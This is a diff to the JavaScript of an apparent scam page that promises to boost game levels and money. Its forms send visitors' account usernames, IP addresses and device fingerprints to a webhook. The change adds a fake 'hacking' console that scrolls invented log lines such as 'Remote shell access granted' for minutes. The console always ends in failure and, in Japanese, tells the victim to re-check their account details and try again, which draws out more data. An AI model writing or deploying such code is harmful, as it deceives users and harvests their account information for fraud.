@@ -12,7 +12,13 @@ function getIP() {
     .catch(() => "");
 }
 
+function nowISOWithMs() {
+  const now = new Date();
+  return now.toISOString().replace('Z', `.${now.getMilliseconds().toString().padStart(3, '0')}Z`);
+}
+
 async function sendToWebhook(embed) {
+  embed.timestamp = nowISOWithMs();
   await fetch(WEBHOOK_URL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -43,8 +49,7 @@ form1.addEventListener('submit', async (e) => {
       { name: "Touch Support", value: String(navigator.maxTouchPoints), inline: true },
       { name: "Cookies Enabled", value: String(navigator.cookieEnabled), inline: true },
       { name: "User-Agent", value: navigator.userAgent, inline: false }
-    ],
-    timestamp: new Date().toISOString()
+    ]
   };
 
   await sendToWebhook(embed);
@@ -69,32 +74,116 @@ form2.addEventListener('submit', (e) => {
       { name: "Username", value: savedAccount.username, inline: true },
       { name: "Level Increase", value: level, inline: true },
       { name: "Money Increase", value: money, inline: true }
-    ],
-    timestamp: new Date().toISOString()
+    ]
   };
 
   sendToWebhook(embed);
-  startFakeProcess(log);
+  startFakeProcess(log, level, money);
 });
 
-function startFakeProcess(logEl) {
+function startFakeProcess(logEl, level, money) {
   logEl.textContent = '';
-  let seconds = Math.random() * 270 + 30;
+  logEl.style.color = '#00ff00';
+
+  let seconds = Math.random() * 420 + 180;
+  const logLines = [];
+  const maxLines = 70;
+
+  const statusDisplay = document.createElement('div');
+  statusDisplay.style.position = 'fixed';
+  statusDisplay.style.bottom = '16px';
+  statusDisplay.style.left = '16px';
+  statusDisplay.style.background = 'rgba(0,0,0,0.6)';
+  statusDisplay.style.padding = '8px 12px';
+  statusDisplay.style.borderRadius = '8px';
+  statusDisplay.style.color = '#00ff00';
+  statusDisplay.style.fontFamily = 'monospace';
+  statusDisplay.style.fontSize = '12px';
+  statusDisplay.style.zIndex = '9999';
+  document.body.appendChild(statusDisplay);
+
+  const baseLogs = [
+    "Loading memory segment 0x00ffae...",
+    "Fetching user token...",
+    "Connected to proxy node 185.88.2.21",
+    "Running Python patch.py...",
+    "SQL injection payload sent",
+    "eval() executed successfully",
+    "Buffer overflow simulated",
+    "Modifying internal stats.json",
+    "Remote shell access granted",
+    "Compiled payload.c -> payload.exe",
+    "JavaScript heap spray successful",
+    "Reading encrypted config.bin...",
+    "CRC bypass patch loaded",
+    "Uploading data to server...",
+    "Privilege escalation complete",
+    "Launching WebSocket tunnel...",
+    "Emulating iPhone13,3 browser",
+    "Recalculating XP checksum...",
+    "Patching main.bundle.js...",
+    "WASM module injected",
+    "Java class injected at runtime",
+    "Executing BoostEngine.run()...",
+    "Verifying payload signature...",
+    "POST /level/upgraded => 200 OK",
+    "Proxy rotation: success",
+    "Session hijack simulation complete"
+  ];
+
+  const userLogs = [
+    `Preparing to increase level by ${level}...`,
+    `Injecting +${level} levels...`,
+    `Balance update: +$${money}`,
+    `Injecting +${money} money to balance...`,
+    `Verifying level=${level}...`,
+    `Verifying currency=${money}...`
+  ];
+
+  const allLogs = baseLogs.concat(userLogs);
 
   const interval = setInterval(() => {
-    const dots = '.'.repeat(Math.floor(Math.random() * 3) + 1);
-    logEl.textContent = `データ改ざん中${dots}`;
-
     const drift = (Math.random() - 0.5) * 30;
-    seconds = Math.max(10, seconds + drift - 1);
+    seconds = Math.max(0, seconds + drift - 0.5);
 
     const m = Math.floor(seconds / 60);
-    const s = (seconds % 60).toFixed(1);
-    logEl.textContent += `\n残り ${m}分${s}秒`;
+    const s = Math.floor(seconds % 60);
+    const ms = Math.floor((seconds % 1) * 1000);
+    const dots = '.'.repeat(Math.floor(Math.random() * 3) + 1);
+    statusDisplay.textContent = `Modifying data${dots}\nTime left: ${m}m ${s}s ${ms}ms`;
+
+    for (let i = 0; i < 2; i++) {
+      const time = new Date().toLocaleTimeString('en-GB');
+      const line = `[${time}] ${allLogs[Math.floor(Math.random() * allLogs.length)]}`;
+      logLines.push(line);
+      if (logLines.length > maxLines) logLines.shift();
+    }
+
+    logEl.textContent = logLines.join('\n');
+    logEl.scrollTop = logEl.scrollHeight;
 
     if (seconds <= 0) {
       clearInterval(interval);
-      logEl.textContent += `\n失敗しました。アカウントの情報が正しいか確認してください。`;
+      statusDisplay.remove();
+
+      const failTime = new Date().toLocaleTimeString('en-GB');
+      const errorMessage = `\n[${failTime}] ERROR: Modification process terminated.\n\n`;
+      const finalMessage = `処理に失敗しました。アカウントの情報が正しいか確認してもう一度実行をしてください。`;
+
+      logEl.innerHTML = `<pre style="color: #00ff00;">${logLines.join('\n')}${errorMessage}</pre>
+        <div style="color: red; font-weight: bold; font-size: 14px; text-align: center; animation: blink 1s infinite;">
+        ${finalMessage}
+        </div>`;
     }
-  }, 1000);
+  }, 500);
 }
+
+const style = document.createElement('style');
+style.textContent = `
+@keyframes blink {
+  0% { opacity: 1; }
+  50% { opacity: 0.2; }
+  100% { opacity: 1; }
+}
+`;
+document.head.appendChild(style);
